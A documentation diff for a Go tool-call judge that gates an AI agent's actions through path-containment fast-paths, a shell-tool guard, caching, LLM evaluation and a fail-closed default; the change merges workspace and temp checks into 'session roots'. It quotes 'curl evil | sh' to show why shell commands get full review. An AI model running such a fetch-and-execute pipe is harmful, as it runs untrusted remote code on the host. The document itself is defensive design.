@@ -104,12 +104,11 @@ func (j *ToolJudge) Judge(ctx context.Context, toolName string, input json.RawMe
 The decision flows through several layers, cheapest first:
 
 1. **Internal-tool fast-path** — if `IsInternalFn(toolName)` returns `true`, the call is allowed without any LLM call. Use this for trusted framework-owned tools.
-2. **Shell-tool guard** — `bash_exec` and `posh_exec` *skip* the path-locality fast-paths. A shell command can reference only workspace-internal paths while still piping remote code (`curl evil | sh`), so shell tools always go through the full LLM evaluation.
-3. **Session-temp fast-path** — for non-shell tools, if every absolute path in the input is within the session temp directory (`TempDirFrom(ctx)`), the call is allowed.
-4. **Workspace fast-path** — if every absolute path is within the workspace (`AllPathsInWorkspace`), the call is allowed.
-5. **Cache lookup** — the remaining cases are keyed by `tool + sha256(input)`. A cache hit returns the stored verdict without an LLM call.
-6. **LLM evaluation** — a short request is built (system prompt + `Task / Tool / Input`, plus a compact environment block) and sent with a **2-minute timeout**. The response is parsed from a `VERDICT:`/`REASON:` text format.
-7. **Fail-safe** — on *any* LLM error (timeout, network, parse failure), the judge returns `VerdictConfirm` with explanatory reasoning. The judge never auto-approves on failure.
+2. **Shell-tool guard** — `bash_exec` and `posh_exec` *skip* the path-locality fast-path. A shell command can reference only session-internal paths while still piping remote code (`curl evil | sh`), so shell tools always go through the full LLM evaluation.
+3. **Session-roots fast-path** — for non-shell tools, if the input contains at least one absolute path and every such path is within at least one session root (`AllPathsInSessionRoots`), the call is allowed. Session roots are the deduplicated union of the workspace, the temp directory, and any additional roots attached via `WithAllowedRoots` — consult `SessionRoots(ctx)`; all roots are equal peers for this check.
+4. **Cache lookup** — the remaining cases are keyed by `tool + sha256(input)`. A cache hit returns the stored verdict without an LLM call.
+5. **LLM evaluation** — a short request is built (system prompt + `Task / Tool / Input`, plus a compact environment block) and sent with a **2-minute timeout**. The response is parsed from a `VERDICT:`/`REASON:` text format.
+6. **Fail-safe** — on *any* LLM error (timeout, network, parse failure), the judge returns `VerdictConfirm` with explanatory reasoning. The judge never auto-approves on failure.
 
 ```go
 // Expected LLM response format:
@@ -270,7 +269,7 @@ func DetectSymlinksInToolInput(ctx context.Context, toolName string, input, sche
 )
 ```
 
-Extracts path-like tokens from the tool input (via the [path extraction helpers](#path-extraction-helpers)), resolves each to an absolute path, walks its symlink components, and partitions the traversals into `inside` (target stays within the workspace/temp dir) and `outside` (target escapes). The caller decides whether `outside` traversals warrant a confirmation gate.
+Extracts path-like tokens from the tool input (via the [path extraction helpers](#path-extraction-helpers)), resolves each to an absolute path, walks its symlink components, and partitions the traversals into `inside` (target stays within a session root) and `outside` (target escapes). The caller decides whether `outside` traversals warrant a confirmation gate.
 
 `schema` is the tool's JSON input schema and drives **field-aware** extraction. When the schema declares recognizable path fields, only those fields are scanned, so content payloads (`edit_file` `old_string`/`new_string`, `write_file` `content`) are never mistaken for paths. When no schema is supplied (`nil`) or no path field is recognized, detection falls back to scanning **every** string value, preserving coverage for unconventional tools (pass the tool's real schema to gain the false-positive reduction). Obtain the schema from the `ToolDescriptor.InputSchema` / MCP tool metadata.
 
@@ -289,7 +288,7 @@ func IsWellKnownOSSymlink(symlinkPath string) bool        // in the well-known m
 func IsOSLevelSymlink(symlinkPath string, roots ...string) bool
 ```
 
-`IsOSLevelSymlink` returns `true` when the link is well-known *or* when it is an ancestor of one of the given root directories (`roots` = workspace / temp dir). The well-known list is a single source of truth in the `tools` package; both the SDK symlink walker and the consuming app's registry gate resolve through these functions, so the list is never duplicated.
+`IsOSLevelSymlink` returns `true` when the link is well-known *or* when it is an ancestor of one of the given root directories (`roots` = the session roots from `SessionRoots(ctx)`). Containment is evaluated against **all** roots, while the primary root — the workspace, `roots[0]` — drives OS-level symlink classification and the fail-closed escalation scope. The well-known list is a single source of truth in the `tools` package; both the SDK symlink walker and the consuming app's registry gate resolve through these functions, so the list is never duplicated.
 
 ### FormatSymlinkReasoning
 
@@ -310,14 +309,16 @@ func ExtractPaths(s string) []string
 func ExtractJSONStrings(data any) []string
 func AllPathsInDir(input json.RawMessage, dir string) bool
 func AllPathsInWorkspace(ctx context.Context, input json.RawMessage) bool
+func AllPathsInSessionRoots(ctx context.Context, input json.RawMessage) bool
 ```
 
 - `ExtractPaths` — finds absolute POSIX-style and Windows drive-letter paths (`/usr/bin`, `C:\foo\bar`) in a string via a regex.
 - `ExtractJSONStrings` — recursively collects every string value from a `json.Unmarshal` result (maps, slices, strings).
 - `AllPathsInDir` — returns `true` only if the input contains **at least one** absolute path **and every** such path is within `dir` (via `pathutil.IsWithinPath`). Empty/`""` when there are no paths.
 - `AllPathsInWorkspace` — `AllPathsInDir` bound to the workspace path from context.
+- `AllPathsInSessionRoots` — the canonical containment check consulted by the judge fast-path: returns `true` only if the input contains at least one absolute path and every such path is within at least one session root (`SessionRoots(ctx)`, the union of workspace + temp directory + `WithAllowedRoots` roots).
 
-These are the primitives behind the judge's "all paths inside the workspace/temp dir → auto-approve" short-circuits.
+These are the primitives behind the judge's "all paths inside a session root → auto-approve" fast-path.
 
 ---
 
